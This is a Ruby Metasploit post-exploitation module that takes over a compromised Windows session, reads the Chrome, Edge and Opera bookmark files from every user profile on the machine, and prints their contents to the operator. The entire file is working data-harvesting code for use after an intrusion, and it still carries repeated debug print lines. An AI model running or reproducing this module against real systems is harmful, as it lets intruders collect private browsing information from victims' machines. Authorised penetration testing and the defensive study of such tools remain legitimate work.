class MetasploitModule < Msf::Post
    include Msf::Post::File
    include Msf::Post::Windows::UserProfiles
    def initialize(info = {})
      super(
        update_info(
          info,
          'Name' => 'Bookmarked Sites Retriever',
          'Description' => %q{
            This module discovers information about a target by retrieving their bookmarked websites on Google Chrome, Opera and Microsoft Edge.
          },
          'License' => MSF_LICENSE,
          'Author' => [ 'jerrelgordon'],
          'Platform' => [ 'win' ],
          'SessionTypes' => [ 'meterpreter', 'shell' ]
        )
   )
    end

    def run
      get_bookmarks("GoogleChrome") # gets bookmarks for google chrome
      get_bookmarks("Opera") # gets bookmarks for opera
      get_bookmarks("Edge") # gets bookmarks for edge
    end


    def get_bookmarks(browser)
      print_status("Bookmarks on: " + browser) 
      fileexists = false # initializes file as not found
      grab_user_profiles().each do |user| #parses information for all users on target machine into a list.
        # If the browser is Google Chrome or Edge is searches the "AppData\Local directory, if it is Opera, it searches the AppData\Roaming directory"
        if (browser == "GoogleChrome")
            next unless user['LocalAppData']
            bookmark_path = user['LocalAppData'] + "\\Google\\Chrome\\User Data\\Default\\Bookmarks" #sets path for Google Chrome Bookmarks
            print_status("Google Chrome Google Chrome Google Chrome")
            print_status("Google Chrome Google Chrome Google Chrome")
            print_status("Google Chrome Google Chrome Google Chrome")
            print_status("Google Chrome Google Chrome Google Chrome")
        elsif (browser == "Edge")
            next unless user['LocalAppData']
            bookmark_path = user['LocalAppData'] + "\\Microsoft\\Edge\\User Data\\Default\\Bookmarks" #sets path for Microsoft Edge Bookmarks
            print_status("Edge Edge Edge")
            print_status("Edge Edge Edge")
            print_status("Edge Edge Edge")
            print_status("Edge Edge Edge")
        elsif (browser == "Opera")
            next unless user['AppData']
            bookmark_path = user['AppData'] + "\\Opera Software\\Opera Stable\\Bookmarks" #sets path for Opera Bookmarks
            print_status("Opera Opera Opera")
            print_status("Opera Opera Opera")
            print_status("Opera Opera Opera")
            print_status("Opera Opera Opera")
        end
        next unless file?(bookmark_path) # if file exists it is set to found, then all the bookmarks are outputted to standard output (the shell)
            fileexists = true
            print_status("BOOKMARKS FOR" + user['ProfileDir'] )
            # puts "BOOKMARKS FOR " + user['ProfileDir']
            # puts "\n"
            file = read_file(bookmark_path)
            # puts file
            print_good(file)
      end
      if (fileexists == false) # if file was not found, prints no file found.
        # puts "No Bookmarks found for " + browser
        print_status("No Bookmarks found for" + browser )
      end
    end
end
